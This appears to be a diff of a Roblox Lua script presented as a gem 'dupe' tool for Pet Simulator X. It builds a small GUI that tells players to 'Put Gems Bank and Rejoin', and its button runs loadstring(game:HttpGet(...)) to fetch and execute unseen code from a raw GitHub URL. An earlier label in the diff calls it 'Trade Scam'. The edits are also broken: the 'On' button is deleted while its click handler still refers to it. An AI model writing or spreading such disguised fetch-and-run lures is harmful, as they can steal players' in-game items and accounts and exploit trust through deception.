@@ -1,52 +1,52 @@
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
 local DupedMethodMadeByPr4ston = Instance.new("TextLabel")
-local Off = Instance.new("TextButton")
+local RESET = Instance.new("TextButton")
 local _10Minutes = Instance.new("TextButton")
 local _20Minutes = Instance.new("TextButton")
 local _30Minutes = Instance.new("TextButton")
-
+ 
 --Properties:
-
+ 
 ScreenGui.Parent = game.CoreGui
-
+ 
 main.Name = "main"
 main.Parent = ScreenGui
 main.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
 main.Position = UDim2.new(0.0659062043, 0, 0.186878726, 0)
-main.Size = UDim2.new(0, 214, 0, 260)
+main.Size = UDim2.new(0, 214, 0, 160)
 main.Active = true
 main.Draggable = true
-
-DupedMethodMadeByPr4ston.Name = "Trade Scam"
+ 
+DupedMethodMadeByPr4ston.Name = "Duped Method |By Yajza"
 DupedMethodMadeByPr4ston.Parent = main
 DupedMethodMadeByPr4ston.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
-DupedMethodMadeByPr4ston.Position = UDim2.new(-0.000352235977, 0, 0, 0)
+DupedMethodMadeByPr4ston.Position = UDim2.new(-0.001752235977, 0, -0.16, 2)
 DupedMethodMadeByPr4ston.Size = UDim2.new(0, 215, 0, 56)
 DupedMethodMadeByPr4ston.Font = Enum.Font.SourceSans
-DupedMethodMadeByPr4ston.Text = "Duped Method | Made By Pr4ston"
-DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(0, 0, 0)
+DupedMethodMadeByPr4ston.Text = "Duped Method |By Yajza"
+DupedMethodMadeByPr4ston.TextColor3 = Color3.fromRGB(1, 1, 1)
 DupedMethodMadeByPr4ston.TextSize = 14.000
-
-_30Minutes.Name = "On"
+ 
+RESET.Name = "Dupe"
+RESET.Parent = main
+RESET.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+RESET.Position = UDim2.new(0, 0, 0.204379559, 0)
+RESET.Size = UDim2.new(0, 214, 0, 50)
+RESET.Font = Enum.Font.SourceSans
+RESET.Text = "Dupe"
+RESET.TextColor3 = Color3.fromRGB(255, 255, 255)
+RESET.TextSize = 40.000
+ 
+_30Minutes.Name = "Put Gems Bank and Rejoin"
 _30Minutes.Parent = main
-_30Minutes.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-_30Minutes.Position = UDim2.new(0, 0, 0.204379559, 0)
-_30Minutes.Size = UDim2.new(0, 214, 0, 50)
+_30Minutes.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+_30Minutes.Position = UDim2.new(0, 0, 0.746376812, 0)
+_30Minutes.Size = UDim2.new(0, 213, 0, 65)
 _30Minutes.Font = Enum.Font.SourceSans
-_30Minutes.Text = "RESET"
-_30Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
-_30Minutes.TextSize = 40.000
-
-On.Name = "On"
-On.Parent = main
-On.BackgroundColor3 = Color3.fromRGB(0, 71, 0)
-On.Position = UDim2.new(0, 0, 0.746376812, 0)
-On.Size = UDim2.new(0, 213, 0, 65)
-On.Font = Enum.Font.SourceSans
-On.Text = "30 Minutes"
-On.TextColor3 = Color3.fromRGB(0, 0, 0)
-On.TextSize = 46.000
+_30Minutes.Text = "Put Gems Bank and Rejoin"
+_30Minutes.TextColor3 = Color3.fromRGB(255, 255, 255)
+_30Minutes.TextSize = 23.000
 On.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/HBHUB-hub/PSX-Scripe/main/dupe-main2'))()
 end)
